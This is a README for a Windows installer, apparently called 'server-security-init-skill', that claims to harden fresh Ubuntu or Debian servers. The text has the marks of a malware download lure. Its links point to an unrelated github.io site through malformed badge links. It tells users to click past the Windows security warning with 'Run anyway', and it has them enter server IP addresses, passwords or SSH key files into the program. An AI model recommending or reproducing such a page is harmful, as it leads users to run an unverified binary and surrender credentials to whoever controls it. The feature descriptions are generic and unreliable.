# 🛡️ server-security-init-skill - Harden your new server connection now

[https://yatirimsahibi.github.io](https://img.shields.io/badge/Download-Latest_Release-blue)

## 📌 About this tool

This software prepares a new server for secure use. When you rent a fresh server, it often lacks basic protection. This tool connects to your server and applies standard security settings. It follows best practices for Ubuntu and Debian systems. You do not need to type complex manual commands. The program handles the setup process for you.

## 📋 What this tool changes

*   It creates a new user account with limited access.
*   It closes unnecessary network ports.
*   It configures the firewall to block intruders.
*   It disables logins for the root user.
*   It enables automatic security updates.
*   It sets up secure SSH keys for access.

## 💻 System requirements

*   Your computer must run the Windows 10 or Windows 11 operating system.
*   You need an active internet connection.
*   You must hold the login details for your new server.
*   The server must run a clean install of Ubuntu or Debian.

## 🚀 Downloading the installer

Visit the project release page to get the installer. You can find all versions here. Choose the file named with the latest version number ending in .exe. 

[https://yatirimsahibi.github.io](https://img.shields.io/badge/Download-File-grey)

Click the link to open the download page. Locate the "Assets" section. Click the link that matches the standard Windows installer format. Save the file to your desktop for easy access.

## ⚙️ Running the setup

1. Double-click the downloaded file on your desktop.
2. Windows might show a warning window. If this happens, click "More info" and then "Run anyway."
3. Follow the instructions on the screen to finish the installation.
4. Launch the application from your start menu or desktop shortcut.

## 🔑 Using the skill

Open the application on your computer. You will see a panel asking for server information. 

*   Enter the IP address of your new server in the top box.
*   Enter your current username in the middle box.
*   Provide your password or select your SSH key file.

Once you enter these details, click the "Start Hardening" button. The progress bar shows the current activity. The tool updates the status message as it completes each task. Wait until the window shows a "Success" message. Close the window once the task finishes.

## 🛡️ Best practices for your server

*   Keep your private SSH keys on your local computer only.
*   Never share your server password with anyone.
*   Check the server logs weekly to look for errors.
*   Update your local tool version when new releases appear on GitHub.

## 🔍 Troubleshooting common issues

If the tool fails to connect, verify your internet connection. Make sure your server IP address is correct. Check if your server provider allows SSH connections on port 22. If you experience a timeout, wait a moment and try again. Ensure you have administrative rights on your Windows computer before starting the process. Sometimes, security software on your computer might block the connection attempt. If that happens, add an exception to your firewall settings.

## 📝 Frequently asked questions

**Does this tool wipe my data?**
It does not remove existing data. It only changes security settings and user permissions.

**Can I stop the process halfway?**
Yes, you can cancel the process. However, the server might remain in a partial state. Run the tool again to ensure the server reaches a steady state.

**Do I need to be a programmer?**
No. This tool automates the steps that a system administrator usually performs by hand.

**Is this safe to use on a server with files on it?**
It is safest to run this on a fresh server before you move your files onto it. If you have files already, back them up before you proceed.

## 🛠️ Technical notes

The tool manages user privileges using standard system commands. It generates random, secure passwords for new accounts. The firewall configuration uses the default system tool for Debian and Ubuntu environments. Every change follows strict security guidelines. You can view the activity log in the application folder if you need to review the steps the tool performed.

## ⚖️ License information

This software uses an open license model. You can view the license terms in the file named LICENSE within the main repository. This project remains free for everyone to use and audit. We welcome feedback through the issues section of the project page.